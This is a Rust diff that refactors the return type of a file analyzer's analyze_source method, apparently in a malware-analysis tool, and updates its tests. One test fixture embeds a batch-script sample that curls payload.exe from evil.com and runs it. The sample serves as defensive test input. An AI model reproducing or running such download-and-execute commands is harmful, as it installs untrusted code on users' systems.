@@ -94,12 +94,12 @@ impl GenericAnalyzer {
         file_path: &Path,
         content: &str,
         stng_strings: &[stng::ExtractedString],
-    ) -> Result<AnalysisReport> {
-        Ok(self.analyze_source_internal(file_path, content, Some(stng_strings)))
+    ) -> AnalysisReport {
+        self.analyze_source_internal(file_path, content, Some(stng_strings))
     }
 
-    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
-        Ok(self.analyze_source_internal(file_path, content, None))
+    fn analyze_source(&self, file_path: &Path, content: &str) -> AnalysisReport {
+        self.analyze_source_internal(file_path, content, None)
     }
 
     fn analyze_source_internal(
@@ -402,7 +402,7 @@ impl Analyzer for GenericAnalyzer {
     fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
         let bytes = fs::read(file_path).context("Failed to read file")?;
         let content = String::from_utf8_lossy(&bytes);
-        self.analyze_source(file_path, &content)
+        Ok(self.analyze_source(file_path, &content))
     }
 
     fn can_analyze(&self, _file_path: &Path) -> bool {
@@ -426,7 +426,7 @@ set PATH="%PATH%;C:\malware"
 curl "http://evil.com/payload.exe" -o "payload.exe"
 start payload.exe
 "#;
-        let report = analyzer.analyze_source(&path, code).unwrap();
+        let report = analyzer.analyze_source(&path, code);
 
         // Should extract strings (quoted strings are extracted)
         assert!(!report.strings.is_empty());
@@ -443,7 +443,7 @@ import Foundation
 let url = URL(string: "http://example.com")!
 let task = URLSession.shared.dataTask(with: url)
 "#;
-        let report = analyzer.analyze_source(&path, code).unwrap();
+        let report = analyzer.analyze_source(&path, code);
 
         // Should have structural feature
         assert!(report.structure.iter().any(|s| s.id.contains("swift")));
